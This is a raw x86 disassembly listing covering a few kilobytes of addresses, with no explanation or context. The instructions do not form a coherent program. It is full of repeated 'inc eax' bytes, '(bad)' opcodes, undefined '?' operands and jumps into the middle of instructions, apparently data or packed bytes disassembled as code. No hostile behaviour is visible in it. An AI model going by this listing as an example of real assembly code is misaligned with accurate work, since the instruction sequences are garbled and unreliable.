  40ac8d:	inc    eax
  40ac8e:	inc    eax
  40ac8f:	dec    ecx
  40ac90:	push   ecx
  40ac91:	fiadd  WORD PTR [ebx+0x18]
  40ac94:	push   edx
  40ac95:	or     eax,0x3040e13c
  40ac9a:	jp     0x40ac44
  40ac9c:	jae    0x40ace6
  40ac9e:	inc    eax
  40ac9f:	aas    
  40aca0:	sub    eax,DWORD PTR [esp+ecx*8+0x12]
  40aca4:	sub    al,0x86
  40aca6:	inc    eax
  40aca7:	je     0x40acf4
  40aca9:	sub    eax,0xc2db4162
  40acae:	inc    eax
  40acaf:	popa   
  40acb0:	inc    eax
  40acb1:	cs pop edi
  40acb3:	add    BYTE PTR [eax+0x40],0x40
  40acb7:	inc    eax
  40acb8:	inc    eax
  40acb9:	inc    eax
  40acba:	rol    DWORD PTR [eax+0x40],0x51
  40acbe:	add    eax,0xcd32082e
  40acc3:	xor    eax,0x4045a8c3
  40acc8:	and    edx,ebp
  40acca:	fld    QWORD PTR [eax+0x48]
  40accd:	inc    ecx
  40acce:	repnz inc eax
  40acd0:	pop    esp
  40acd1:	gs stos BYTE PTR es:[edi],al
  40acd3:	pop    eax
  40acd4:	inc    esp
  40acd5:	sub    bh,al
  40acd7:	inc    eax
  40acd8:	jecxz  0x40ad1e
  40acda:	fs cmp dl,al
  40acdd:	inc    eax
  40acde:	rol    BYTE PTR [eax+0x40],0x0
  40ace2:	inc    eax
  40ace3:	inc    eax
  40ace4:	inc    eax
  40ace5:	inc    eax
  40ace6:	inc    eax
  40ace7:	inc    eax
  40ace8:	add    al,0x4
  40acea:	imul   edi,ecx,0xd400b4c3
  40acf0:	inc    eax
  40acf1:	mov    eax,ds:0x62481c6f
  40acf6:	les    edi,FWORD PTR [edx-0x22ae8dc0]
  40acfc:	inc    esp
  40acfd:	retf   
  40acfe:	inc    eax
  40acff:	jmp    0x40ad41
  40ad01:	inc    eax
  40ad02:	inc    eax
  40ad03:	inc    eax
  40ad04:	inc    eax
  40ad05:	inc    eax
  40ad06:	inc    eax
  40ad07:	inc    eax
  40ad08:	inc    eax
  40ad09:	inc    eax
  40ad0a:	inc    eax
  40ad0b:	xor    DWORD PTR [ebx],edi
  40ad0d:	(bad)  
  40ad0e:	fdiv   DWORD PTR [esi]
  40ad10:	sub    BYTE PTR [eax+0x40],dl
  40ad13:	jns    0x40ad58
  40ad15:	(bad)  
  40ad18:	pop    ebx
  40ad19:	(bad)  
  40ad1a:	xlat   BYTE PTR ds:[ebx]
  40ad1b:	and    DWORD PTR [edi+0x4a],esp
  40ad1e:	arpl   WORD PTR [edx+0x34],sp
  40ad21:	ins    BYTE PTR es:[edi],dx
  40ad22:	mov    ds:0x6ed4571,al
  40ad27:	inc    eax
  40ad28:	inc    eax
  40ad29:	inc    eax
  40ad2a:	inc    eax
  40ad2b:	inc    eax
  40ad2c:	inc    eax
  40ad2d:	int3   
  40ad2e:	jne    0x40ad70
  40ad30:	push   esp
  40ad31:	inc    eax
  40ad32:	pushf  
  40ad33:	out    0x23,eax
  40ad35:	add    eax,0x4a244444
  40ad3a:	stc    
  40ad3b:	xor    eax,0xdd2c4142
  40ad40:	cmp    BYTE PTR [eax-0x15],al
  40ad43:	sub    eax,0x402a32e0
  40ad48:	add    cl,al
  40ad4a:	inc    eax
  40ad4b:	inc    eax
  40ad4c:	inc    eax
  40ad4d:	inc    eax
  40ad4e:	add    BYTE PTR [eax+0x29],al
  40ad51:	ret    
  40ad52:	xor    al,0x51
  40ad54:	mov    ?,WORD PTR [edi+0x6a705643]
  40ad5a:	jge    0x40adbe
  40ad5c:	sub    DWORD PTR [ebp+0x1e],0xc37e638d
  40ad63:	lds    esi,FWORD PTR [edi+0xc]
  40ad66:	inc    esp
  40ad67:	inc    esp
  40ad68:	aad    0x55
  40ad6a:	inc    eax
  40ad6b:	or     eax,DWORD PTR [eax+0x40]
  40ad6e:	inc    eax
  40ad6f:	inc    eax
  40ad70:	inc    eax
  40ad71:	inc    eax
  40ad72:	inc    eax
  40ad73:	inc    eax
  40ad74:	inc    DWORD PTR [eax+0x52]
  40ad77:	and    edi,edi
  40ad79:	sub    al,0xed
  40ad7b:	adc    eax,0x77d49502
  40ad80:	xor    al,0x28
  40ad82:	lods   eax,DWORD PTR ds:[esi]
  40ad83:	rol    BYTE PTR [ebx+0x40],0x40
  40ad87:	inc    eax
  40ad88:	inc    eax
  40ad89:	inc    eax
  40ad8a:	inc    eax
  40ad8b:	inc    eax
  40ad8c:	inc    eax
  40ad8d:	inc    eax
  40ad8e:	inc    eax
  40ad8f:	jmp    0x40adf5
  40ad91:	and    DWORD PTR [edx+0x15],esp
  40ad94:	arpl   bp,bp
  40ad96:	pop    eax
  40ad97:	push   eax
  40ad98:	sub    al,BYTE PTR [eax+0x40]
  40ad9b:	mov    DWORD PTR [edx+0x53],eax
  40ad9e:	jecxz  0x40ae02
  40ada0:	xchg   esi,eax
  40ada1:	mov    al,ds:0x402a4425
  40ada6:	inc    eax
  40ada7:	inc    eax
  40ada8:	inc    eax
  40ada9:	inc    eax
  40adaa:	inc    eax
  40adab:	inc    eax
  40adac:	inc    eax
  40adad:	add    BYTE PTR [edi],cl
  40adaf:	inc    esp
  40adb0:	arpl   cx,bx
  40adb2:	daa    
  40adb3:	outs   dx,BYTE PTR ds:[esi]
  40adb4:	sub    al,0x11
  40adb6:	je     0x40ae14
  40adb8:	pushf  
  40adb9:	outs   dx,DWORD PTR ds:[esi]
  40adba:	std    
  40adbb:	inc    eax
  40adbc:	es push eax
  40adbe:	(bad)  
  40adbf:	enter  0xc368,0xa2
  40adc3:	ins    DWORD PTR es:[edi],dx
  40adc4:	lds    ecx,FWORD PTR [eax]
  40adc6:	xchg   ecx,eax
  40adc7:	inc    ebp
  40adc8:	sub    al,0x2b
  40adca:	and    DWORD PTR [eax+0x57],eax
  40adcd:	inc    eax
  40adce:	inc    eax
  40adcf:	inc    eax
  40add0:	inc    eax
  40add1:	inc    eax
  40add2:	inc    eax
  40add3:	and    eax,0xcb404040
  40add8:	dec    ecx
  40add9:	cmp    BYTE PTR cs:[edi],bh
  40addc:	mul    BYTE PTR [edx]
  40adde:	dec    BYTE PTR [eax-0x33]
  40ade1:	test   al,0xcd
  40ade3:	imul   esp,DWORD PTR [ecx+0x40404040],0x40404040
  40aded:	inc    eax
  40adee:	inc    eax
  40adef:	dec    edx
  40adf0:	inc    esp
  40adf1:	inc    esp
  40adf2:	enter  0xe954,0x68
  40adf6:	xor    eax,0x497e2c40
  40adfb:	sub    ah,BYTE PTR [edx]
  40adfd:	outs   dx,DWORD PTR ds:[esi]
  40adfe:	jle    0x40ae40
  40ae00:	inc    eax
  40ae01:	inc    eax
  40ae02:	inc    eax
  40ae03:	inc    eax
  40ae04:	inc    eax
  40ae05:	rol    DWORD PTR [eax+0x40],0x11
  40ae09:	and    al,0xe0
  40ae0b:	sub    eax,0x61e16542
  40ae10:	pop    ss
  40ae11:	pop    edx
  40ae12:	(bad)  
  40ae13:	or     bh,BYTE PTR [edx]
  40ae15:	jmp    0x40adf0
  40ae17:	jbe    0x40ae67
  40ae19:	popf   
  40ae1a:	fcom   QWORD PTR [edi-0x70]
  40ae1d:	push   eax
  40ae1e:	shl    edx,0x44
  40ae21:	inc    esp
  40ae22:	inc    ebp
  40ae23:	lds    ecx,FWORD PTR [ebx+0x62]
  40ae26:	xchg   DWORD PTR [eax+0x40004040],ebp
  40ae2c:	inc    eax
  40ae2d:	inc    eax
  40ae2e:	inc    eax
  40ae2f:	inc    eax
  40ae30:	inc    eax
  40ae31:	and    al,0x2c
  40ae33:	rcl    BYTE PTR [ecx+0x4b8ac5dc],1
  40ae39:	data16 and bh,BYTE PTR [edx]
  40ae3c:	cmp    BYTE PTR [ebx+0x59],cl
  40ae3f:	and    al,BYTE PTR es:[edx+0x51]
  40ae43:	aaa    
  40ae44:	bound  ebx,QWORD PTR [eax+0x404040ed]
  40ae4a:	inc    eax
  40ae4b:	inc    eax
  40ae4c:	inc    eax
  40ae4d:	inc    eax
  40ae4e:	inc    eax
  40ae4f:	inc    eax
  40ae50:	inc    eax
  40ae51:	add    DWORD PTR fs:[ecx],ebp
  40ae54:	popf   
  40ae55:	std    
  40ae56:	inc    edx
  40ae57:	and    BYTE PTR [ebp-0x52],cl
  40ae5a:	retf   0x44e6
  40ae5d:	arpl   WORD PTR [eax+0x40],ax
  40ae60:	inc    eax
  40ae61:	inc    eax
  40ae62:	inc    eax
  40ae63:	inc    eax
  40ae64:	int3   
  40ae65:	jne    0x40aea7
  40ae67:	sub    bh,ah
  40ae69:	sub    al,0xa4
  40ae6b:	mov    eax,ds:0x11592c40
  40ae70:	inc    edx
  40ae71:	xor    al,0xfa
  40ae73:	xor    al,0x60
  40ae75:	and    BYTE PTR [eax],bh
  40ae77:	mov    al,0xc9
  40ae79:	aad    0xac
  40ae7b:	jae    0x40aebf
  40ae7d:	inc    eax
  40ae7e:	add    cl,al
  40ae80:	inc    eax
  40ae81:	inc    eax
  40ae82:	inc    eax
  40ae83:	inc    eax
  40ae84:	add    BYTE PTR [eax+0x48],al
  40ae87:	mov    edx,0x2d7d4c41
  40ae8c:	pop    ds
  40ae8d:	inc    eax
  40ae8e:	popf   
  40ae8f:	popf   
  40ae90:	or     eax,0xe719fa05
  40ae95:	adc    eax,0x40404040
  40ae9a:	inc    eax
  40ae9b:	inc    eax
  40ae9c:	inc    eax
  40ae9d:	inc    eax
  40ae9e:	inc    DWORD PTR [eax+0x44]
  40aea1:	test   al,0xfc
  40aea3:	retf   
  40aea4:	loopne 0x40af0a
  40aea6:	xchg   edi,eax
  40aea7:	cs sub al,0x11
  40aeaa:	bound  edi,QWORD PTR [esp+edx*1+0x1e4e5107]
  40aeb1:	inc    esp
  40aeb2:	inc    eax
  40aeb3:	inc    eax
  40aeb4:	inc    eax
  40aeb5:	inc    eax
  40aeb6:	inc    eax
  40aeb7:	inc    eax
  40aeb8:	inc    eax
  40aeb9:	inc    eax
  40aeba:	inc    eax
  40aebb:	inc    eax
  40aebc:	inc    ebx
  40aebd:	inc    ebx
  40aebe:	arpl   WORD PTR [ebx+0x8d540e1],sp
  40aec4:	rol    BYTE PTR [eax+0x3751d7cd],0x45
  40aecb:	retf   
  40aecc:	push   esp
  40aecd:	mov    BYTE PTR [ebp-0x1f],bh
  40aed0:	inc    DWORD PTR [eax-0x2]
  40aed3:	inc    esp
  40aed4:	call   0x514b9c3c
  40aed9:	inc    eax
  40aeda:	inc    eax
  40aedb:	inc    eax
  40aedc:	inc    eax
  40aedd:	inc    eax
  40aede:	inc    eax
  40aedf:	inc    eax
  40aee0:	inc    eax
  40aee1:	add    BYTE PTR [eax+0x48],ch
  40aee4:	xor    ebp,DWORD PTR [esp+eax*2]
  40aee7:	stc    
  40aee8:	das    
  40aee9:	inc    DWORD PTR [eax+0x3c]
  40aeec:	and    BYTE PTR [edx+0x42],ah
  40aeef:	loopne 0x40af31
  40aef1:	inc    eax
  40aef2:	inc    eax
  40aef3:	inc    eax
  40aef4:	inc    eax
  40aef5:	inc    eax
  40aef6:	and    eax,0x93404040
  40aefb:	push   ecx
  40aefc:	pusha  
  40aefd:	sbb    al,0x48
  40aeff:	sbb    ebp,ecx
  40af01:	or     DWORD PTR [edi+edi*8+0x56],edx
  40af05:	and    dl,BYTE PTR [ecx]
  40af07:	and    BYTE PTR [eax+0x40],al
  40af0a:	inc    eax
  40af0b:	inc    eax
  40af0c:	inc    eax
  40af0d:	inc    eax
  40af0e:	inc    eax
  40af0f:	inc    eax
  40af10:	inc    eax
  40af11:	inc    eax
  40af12:	push   eax
  40af13:	arpl   WORD PTR [esi],bp
  40af15:	pop    edi
  40af16:	inc    eax
  40af17:	in     eax,dx
  40af18:	retf   
  40af19:	addr16 leave 
  40af1b:	dec    ebx
  40af1c:	add    esp,DWORD PTR [eax+0x59481601]
  40af22:	inc    eax
  40af23:	inc    eax
  40af24:	inc    eax
  40af25:	inc    eax
  40af26:	inc    eax
  40af27:	inc    eax
  40af28:	rol    DWORD PTR [eax+0x40],0xe
  40af2c:	cld    
  40af2d:	out    0x16,eax
  40af2f:	and    al,0x44
  40af31:	inc    ecx
  40af32:	fcom   DWORD PTR [edx]
  40af34:	loopne 0x40af82
  40af36:	inc    DWORD PTR [eax+0x2d]
  40af39:	inc    ebx
  40af3a:	(bad)  
  40af3b:	bound  ecx,QWORD PTR [eax]
  40af3d:	sub    al,0x2e
  40af3f:	das    
  40af40:	sbb    dl,al
  40af42:	cmc    
  40af43:	inc    edx
  40af44:	fs icebp 
  40af46:	inc    eax
  40af47:	inc    eax
  40af48:	add    BYTE PTR [eax+0x40],al
  40af4b:	inc    eax
  40af4c:	inc    eax
  40af4d:	inc    eax
  40af4e:	inc    eax
  40af4f:	inc    ecx
  40af50:	lds    edx,FWORD PTR es:[ebx-0x58]
  40af54:	fcom   QWORD PTR [eax-0x7b]
  40af57:	mov    al,ds:0x11cb5740
  40af5c:	mov    esp,0x60bd4cec
  40af61:	(bad)  
  40af62:	adc    bh,BYTE PTR [eax+0x40404040]
  40af68:	inc    eax
  40af69:	inc    eax
  40af6a:	inc    eax
  40af6b:	inc    eax
  40af6c:	inc    eax
  40af6d:	inc    eax
  40af6e:	call   0xb044:0x46e62e0
  40af75:	inc    edx
  40af76:	and    eax,0x4152a408
  40af7b:	sub    al,0x15
  40af7d:	shl    DWORD PTR [edx+0x64],0xd
  40af81:	loopne 0x40af9f
  40af83:	sbb    BYTE PTR [ecx+0x40],al
  40af86:	inc    eax
  40af87:	inc    eax
  40af88:	inc    eax
  40af89:	inc    eax
  40af8a:	inc    eax
  40af8b:	int3   
  40af8c:	jne    0x40afce
  40af8e:	fcom   DWORD PTR [eax+0x402d625d]
  40af94:	jp     0x40af5a
  40af96:	arpl   WORD PTR [esp+edi*8+0x40],bx
  40af9a:	dec    ebx
  40af9b:	and    ebp,DWORD PTR [ecx-0x1f9d5014]
  40afa1:	std    
  40afa2:	and    dl,BYTE PTR [esi+0x40]
  40afa5:	add    cl,al
  40afa7:	inc    eax
  40afa8:	inc    eax
  40afa9:	inc    eax
  40afaa:	inc    eax
  40afab:	add    BYTE PTR [eax+0x1a],al
  40afae:	fs int3 
  40afb0:	or     BYTE PTR gs:[edx+0x6e],al
  40afb4:	inc    eax
  40afb5:	je     0x40affa
  40afb7:	mov    cl,0x40
  40afb9:	fs out 0x4d,al
  40afbc:	sub    DWORD PTR [edx-0x38],esp
  40afbf:	xchg   BYTE PTR fs:[esi-0x21],cl
  40afc3:	stos   DWORD PTR es:[edi],eax
  40afc4:	inc    eax
  40afc5:	arpl   WORD PTR [eax+0x40],ax
  40afc8:	inc    eax
  40afc9:	inc    eax
  40afca:	inc    eax
  40afcb:	inc    eax
  40afcc:	inc    eax
  40afcd:	inc    eax
  40afce:	inc    DWORD PTR [eax-0xd]
  40afd1:	test   al,0xbc
  40afd3:	cld    
  40afd4:	add    DWORD PTR [ebp+0x2c],0xffffff9c
  40afd8:	sbb    al,0x3d
  40afda:	inc    ecx
  40afdb:	loopne 0x40b052
  40afdd:	mov    ds:0xc13d4440,eax
  40afe2:	clc    
  40afe3:	or     dh,bl
  40afe5:	inc    edx
  40afe6:	cs sub al,0x9f
  40afe9:	test   al,0x88
  40afeb:	inc    eax
  40afec:	inc    eax
  40afed:	inc    eax
  40afee:	inc    eax
  40afef:	inc    eax
  40aff0:	inc    eax
  40aff1:	inc    eax
  40aff2:	inc    eax
  40aff3:	inc    eax
  40aff4:	inc    eax
  40aff5:	bound  esp,QWORD PTR fs:[eax+0x40]
  40aff9:	adc    al,0xec
  40affb:	inc    ecx
  40affc:	push   ebp
  40affd:	fnstsw WORD PTR [ebx+0x64c5b617]
  40b003:	pop    edx
  40b004:	pop    esp
  40b005:	hlt    
  40b006:	pop    ds
  40b007:	xor    eax,DWORD PTR [eax+0x41]
  40b00a:	retf   0x2c38
  40b00d:	fs aas 
  40b00f:	inc    edx
  40b010:	inc    eax
  40b011:	out    dx,al
  40b012:	ss ins DWORD PTR es:[edi],dx
  40b014:	mov    edi,0x40404040
  40b019:	inc    eax
  40b01a:	inc    eax
  40b01b:	inc    eax
  40b01c:	inc    eax
  40b01d:	add    al,ah
  40b01f:	leave  
  40b020:	stos   DWORD PTR es:[edi],eax
  40b021:	xor    eax,DWORD PTR [ebp+edi*2+0x30]
  40b025:	inc    ecx
  40b026:	or     BYTE PTR [esp+eax*2-0x3f9dd3a4],ch
  40b02d:	xchg   BYTE PTR [ebx-0x28],ah
  40b030:	loopne 0x40b072
  40b032:	inc    eax
  40b033:	inc    eax
  40b034:	inc    eax
  40b035:	inc    eax
  40b036:	inc    eax
  40b037:	and    eax,0x40404040
  40b03c:	adc    dh,BYTE PTR [esi]
  40b03e:	inc    esp
  40b03f:	mov    esp,0x2527ebcd
  40b044:	aad    0xdc
  40b046:	xor    eax,0x427ee70d
  40b04b:	inc    eax
  40b04c:	pop    ecx
  40b04d:	fs (bad) 
  40b04f:	retf   
  40b050:	popa   
  40b051:	push   esi
  40b052:	int3   
  40b053:	int3   
  40b054:	int3   
  40b055:	int3   
  40b056:	int3   
  40b057:	int3   
  40b058:	int3   
  40b059:	int3   
  40b05a:	int3   
  40b05b:	int3   
  40b05c:	int3   
  40b05d:	int3   
  40b05e:	int3   
  40b05f:	int3   
  40b060:	and    DWORD PTR [eax],esi
  40b062:	out    dx,al
  40b063:	jg     0x40b014
  40b065:	mov    esp,0x4042d764
  40b06a:	inc    esp
  40b06b:	fmul   DWORD PTR [ebp+0x40404040]
  40b071:	inc    eax
  40b072:	inc    eax
  40b073:	inc    eax
  40b074:	inc    eax
  40b075:	inc    eax
  40b076:	inc    eax
  40b077:	inc    esp
  40b078:	loopne 0x40b050
  40b07a:	loopne 0x40b0dc
  40b07c:	sub    al,0x91
  40b07e:	fs push ss
  40b080:	or     BYTE PTR ds:0xa9106034,bl
  40b086:	mov    al,ds:0xe4e3649c
  40b08b:	inc    eax
  40b08c:	int    0xb4
  40b08e:	aas    
  40b08f:	arpl   WORD PTR [esi-0x6b],cx
  40b092:	mov    ds:0x7d3b8732,al
  40b097:	add    ah,bh
  40b099:	dec    esi
  40b09a:	sub    eax,0x4040e240
  40b09f:	inc    eax
  40b0a0:	inc    eax
  40b0a1:	inc    eax
  40b0a2:	inc    eax
  40b0a3:	rol    DWORD PTR [eax+0x40],0xdb
  40b0a7:	bound  ebp,QWORD PTR [ebx+0x282ac751]
  40b0ad:	inc    esp
  40b0ae:	pusha  
  40b0af:	inc    eax
  40b0b0:	inc    edx
  40b0b1:	cmp    al,0x7b
  40b0b3:	inc    edi
  40b0b4:	fsubr  DWORD PTR [ebx+eax*2]
  40b0b7:	sub    ah,BYTE PTR [edx+eiz*1]
  40b0ba:	inc    edi
  40b0bb:	mov    ds:0xdbc50e40,al
  40b0c0:	pop    ebx
  40b0c1:	aad    0x40
  40b0c3:	inc    eax
  40b0c4:	add    BYTE PTR [eax+0x40],al
  40b0c7:	inc    eax
  40b0c8:	inc    eax
  40b0c9:	inc    eax
  40b0ca:	inc    eax
  40b0cb:	outs   dx,BYTE PTR ds:[esi]
  40b0cc:	xor    BYTE PTR [edx-0x3b],cl
  40b0cf:	dec    ecx
  40b0d0:	push   esi
  40b0d1:	gs jp  0x40b14f
  40b0d4:	dec    eax
  40b0d5:	inc    eax
  40b0d6:	and    BYTE PTR [esp+eiz*2],dh
  40b0d9:	push   eax
  40b0da:	out    dx,al
  40b0db:	stos   BYTE PTR es:[edi],al
  40b0dc:	fs dec ebp
  40b0de:	inc    BYTE PTR [eax+0x79]
  40b0e1:	cmp    al,ah
  40b0e3:	inc    eax
  40b0e4:	inc    eax
  40b0e5:	inc    eax
  40b0e6:	inc    eax
  40b0e7:	inc    eax
  40b0e8:	inc    eax
  40b0e9:	inc    eax
  40b0ea:	inc    eax
  40b0eb:	inc    eax
  40b0ec:	inc    eax
  40b0ed:	xor    ch,BYTE PTR [esi+0x48]
  40b0f0:	inc    esp
  40b0f1:	pop    esp
  40b0f2:	fcom   DWORD PTR [ecx]
  40b0f4:	or     BYTE PTR [ebx+0x3a2c4040],cl
  40b0fa:	arpl   WORD PTR ds:0x65617264,si
  40b100:	or     al,0xc3
  40b102:	call   0xd538:0x45064e3d
  40b109:	dec    eax
  40b10a:	mov    al,ds:0x40404040
  40b10f:	inc    eax
  40b110:	inc    eax
  40b111:	int3   
  40b112:	jne    0x40b154
  40b114:	inc    ebp
  40b115:	cld    
  40b116:	test   al,0x20
  40b118:	inc    eax
  40b119:	dec    ebx
  40b11a:	inc    esp
  40b11b:	addr16 clc 
  40b11d:	loopne 0x40b179
  40b11f:	outs   dx,DWORD PTR ds:[esi]
  40b120:	paddd  mm5,QWORD PTR [ebx-0x56f77cba]
  40b127:	push   ss
  40b128:	inc    eax
  40b129:	inc    esp
  40b12a:	dec    esp
  40b12b:	cmp    BYTE PTR ds:0x407ee863,bl
  40b131:	add    cl,al
  40b133:	inc    eax
  40b134:	inc    eax
  40b135:	inc    eax
  40b136:	inc    eax
  40b137:	add    BYTE PTR [eax+0x14],al
  40b13a:	sub    al,0x62
  40b13c:	cld    
  40b13d:	inc    esp
  40b13e:	lds    esp,FWORD PTR [esi+0x400a4060]
  40b144:	test   al,0x21
  40b146:	cmp    edi,DWORD PTR [bp+si+0x1f]
  40b14a:	int    0x79
  40b14c:	ret    
  40b14d:	pop    es
  40b14e:	xchg   ebp,eax
  40b14f:	test   DWORD PTR [eax+0x40],eax
  40b152:	inc    eax
  40b153:	inc    eax
  40b154:	inc    eax
  40b155:	inc    eax
  40b156:	inc    eax
  40b157:	inc    eax
  40b158:	inc    DWORD PTR [eax+0x57]
  40b15b:	pusha  
  40b15c:	push   eax
  40b15d:	ret    
  40b15e:	(bad)  
  40b15f:	arpl   dx,dx
  40b161:	pop    esi
  40b162:	and    al,dl
  40b164:	out    dx,al
  40b165:	bound  esp,QWORD PTR [edx-0x44]
  40b168:	je     0x40b184
  40b16a:	inc    eax
  40b16b:	inc    eax
  40b16c:	inc    eax
  40b16d:	inc    eax
  40b16e:	inc    eax
  40b16f:	inc    eax
  40b170:	inc    eax
  40b171:	inc    eax
  40b172:	inc    eax
  40b173:	inc    eax
  40b174:	xor    al,0x40
  40b176:	inc    esp
  40b177:	push   edi
  40b178:	adc    ah,dh
  40b17a:	arpl   WORD PTR [ebx+0x622c0345],cx
  40b180:	dec    esp
  40b181:	test   eax,0x40e06209
  40b186:	inc    eax
  40b187:	inc    eax
  40b188:	inc    eax
  40b189:	inc    eax
  40b18a:	inc    eax
  40b18b:	inc    eax
  40b18c:	inc    eax
  40b18d:	add    BYTE PTR [eax+0x8],al
  40b190:	xor    al,0x5
  40b192:	push   edx
  40b193:	add    BYTE PTR [edi],0x28
  40b196:	or     ebp,eax
  40b198:	inc    eax
  40b199:	jb     0x40b1e2
  40b19b:	inc    eax
  40b19c:	inc    eax
  40b19d:	inc    eax
  40b19e:	inc    eax
  40b19f:	inc    eax
  40b1a0:	inc    eax
  40b1a1:	and    eax,0xdb404040
  40b1a6:	jg     0x40b1b5
  40b1a8:	inc    eax
  40b1a9:	pop    ebp
  40b1aa:	inc    esp
  40b1ab:	imul   ebx,DWORD PTR [eax+0x16ede2a0],0xfffffffe
  40b1b2:	cmp    BYTE PTR [edx+0x28],ah
  40b1b5:	(bad)
  40b1ba:	inc    ecx
  40b1bb:	jp     0x40b165
  40b1bd:	int    0x6a
  40b1bf:	and    DWORD PTR [edx],edx
  40b1c1:	cmp    al,0xaa
  40b1c3:	les    edx,FWORD PTR [ecx]
  40b1c5:	jnp    0x40b169
  40b1c7:	inc    eax
  40b1c8:	inc    eax
  40b1c9:	inc    eax
  40b1ca:	inc    eax
  40b1cb:	inc    eax
  40b1cc:	inc    eax
  40b1cd:	inc    eax
  40b1ce:	inc    eax
  40b1cf:	inc    eax
  40b1d0:	inc    eax
  40b1d1:	jmp    0x40b193
  40b1d3:	push   es
  40b1d4:	add    BYTE PTR [edi+0x48],cl
  40b1d7:	test   DWORD PTR [esi],eax
  40b1d9:	push   0x4062d540
  40b1de:	inc    ecx
  40b1df:	fstp   TBYTE PTR [edx]
  40b1e1:	popa   
  40b1e2:	add    eax,0x61483d4b
  40b1e7:	xchg   esp,eax
  40b1e8:	mov    eax,ds:0x3cfe4052
  40b1ed:	inc    edx
  40b1ee:	sub    al,0x63
  40b1f0:	inc    ecx
  40b1f1:	popa   
  40b1f2:	adc    eax,DWORD PTR [ecx+ebp*4-0x70]
  40b1f6:	and    BYTE PTR [eax+eax*2+0x40],ch
  40b1fa:	inc    eax
  40b1fb:	inc    eax
  40b1fc:	inc    eax
  40b1fd:	inc    eax
  40b1fe:	rol    DWORD PTR [eax+0x40],0xb2
  40b202:	loop   0x40b244
  40b204:	sub    al,0xb4
  40b206:	cmp    al,0x2a
  40b208:	in     al,0x28
  40b20a:	mov    al,ds:0x68a30465
  40b20f:	pop    esp
  40b210:	fist   DWORD PTR [esi+0x32cd402f]
  40b216:	inc    esp
  40b217:	push   edx
  40b218:	xchg   esp,eax
  40b219:	xor    DWORD PTR [ebp+0x60],esi
  40b21c:	js     0x40b1e3
  40b21e:	cld    
  40b21f:	cmp    esp,DWORD PTR [ebx+0x77]
  40b222:	and    al,BYTE PTR [eax-0x6]
  40b225:	cmp    al,0x72
  40b227:	dec    eax
  40b228:	inc    eax
  40b229:	inc    eax
  40b22a:	add    BYTE PTR [eax+0x40],al
  40b22d:	inc    eax
  40b22e:	inc    eax
  40b22f:	inc    eax
  40b230:	inc    eax
  40b231:	push   ecx
  40b232:	imul   ebp,DWORD PTR [ebp-0xb],0x44
  40b236:	jbe    0x40b270
  40b238:	cmp    eax,0x31663f9c
  40b23d:	sub    al,0xdc
  40b23f:	inc    eax
  40b240:	inc    eax
  40b241:	inc    eax
  40b242:	inc    eax
  40b243:	inc    eax
  40b244:	inc    eax
  40b245:	inc    eax
  40b246:	inc    eax
  40b247:	inc    eax
  40b248:	inc    eax
  40b249:	dec    eax
  40b24a:	jmp    0x46a30d2a
  40b24f:	add    al,BYTE PTR [ebx+0x54]
  40b252:	ds xchg esp,eax
  40b254:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b255:	xor    al,0xf0
  40b257:	adc    BYTE PTR [eax+0x14],al
  40b25a:	inc    eax
  40b25b:	inc    eax
  40b25c:	inc    eax
  40b25d:	inc    eax
  40b25e:	inc    eax
  40b25f:	inc    eax
  40b260:	int3   
  40b261:	jne    0x40b2a3
  40b263:	dec    esp
  40b264:	arpl   WORD PTR [edx+0x52ad69aa],dx
  40b26a:	mov    bl,0xe8
  40b26c:	dec    eax
  40b26d:	add    BYTE PTR [ebx+0x53],al
  40b270:	pop    ss
  40b271:	dec    ebp
  40b272:	test   al,0x4f
  40b274:	pushf  
  40b275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b276:	popa   
  40b277:	xchg   ebx,eax
  40b278:	mov    WORD PTR [edx+edx*1],?
  40b27b:	inc    eax
  40b27c:	add    cl,al
  40b27e:	inc    eax
  40b27f:	inc    eax
  40b280:	inc    eax
  40b281:	inc    eax
  40b282:	add    BYTE PTR [eax+0x24],al
  40b285:	fistp  DWORD PTR [ebx+0x44]
  40b288:	inc    ebp
  40b289:	bound  eax,QWORD PTR [ecx+0x48]
  40b28c:	jno    0x40b222
  40b28e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b28f:	loope  0x40b2b3
  40b291:	aad    0x88
  40b293:	inc    edx
  40b294:	mov    eax,0xd544f163
  40b299:	dec    esi
  40b29a:	addr16 adc ebx,ecx
  40b29d:	lds    edx,FWORD PTR [ebx+0x20]
  40b2a0:	mov    ds:0x40404040,al
  40b2a5:	inc    eax
  40b2a6:	inc    eax
  40b2a7:	inc    eax
  40b2a8:	inc    eax
  40b2a9:	inc    DWORD PTR [eax-0x3]
  40b2ac:	push   cs
  40b2ad:	rcr    BYTE PTR [ebp-0xfde1c89],1
  40b2b3:	inc    esp
  40b2b4:	cmp    BYTE PTR [edx+0x62],ah
  40b2b7:	in     eax,dx
  40b2b8:	sbb    eax,0x482c60d5
  40b2bd:	jle    0x40b27b
  40b2bf:	fild   DWORD PTR [esi+0x57e4527]
  40b2c5:	fcomp  st(7)
  40b2c7:	xchg   esp,eax
  40b2c8:	inc    ebp
  40b2c9:	jg     0x40b308
  40b2cb:	int    0x40
  40b2cd:	inc    eax
  40b2ce:	inc    eax
  40b2cf:	inc    eax
  40b2d0:	inc    eax
  40b2d1:	inc    eax
  40b2d2:	inc    eax
  40b2d3:	inc    eax
  40b2d4:	inc    eax
  40b2d5:	inc    eax
  40b2d6:	xchg   DWORD PTR [edx-0x5b],edx
  40b2d9:	fs dec edx
  40b2db:	popa   
  40b2dc:	inc    ebp
  40b2dd:	and    BYTE PTR [ecx-0x38],al
  40b2e0:	arpl   WORD PTR [ebx+0x5d],bp
  40b2e3:	dec    ebx
  40b2e4:	aas    
  40b2e5:	inc    eax
  40b2e6:	inc    eax
  40b2e7:	inc    eax
  40b2e8:	inc    eax
  40b2e9:	inc    eax
  40b2ea:	inc    eax
  40b2eb:	inc    eax
  40b2ec:	inc    eax
  40b2ed:	add    dh,bh
  40b2ef:	out    dx,eax
  40b2f0:	dec    ebp
  40b2f1:	sbb    eax,0x45a1adf8
  40b2f6:	inc    esp
  40b2f7:	and    DWORD PTR [ecx],0xffffffd0
  40b2fa:	fisttp DWORD PTR [ebx]
  40b2fc:	jle    0x40b33d
  40b2fe:	sub    al,0x8b
  40b300:	inc    esp
  40b301:	mov    ebp,0x7f255994
  40b306:	jl     0x40b35d
  40b308:	inc    eax
  40b309:	inc    eax
  40b30a:	inc    eax
  40b30b:	inc    eax
  40b30c:	inc    eax
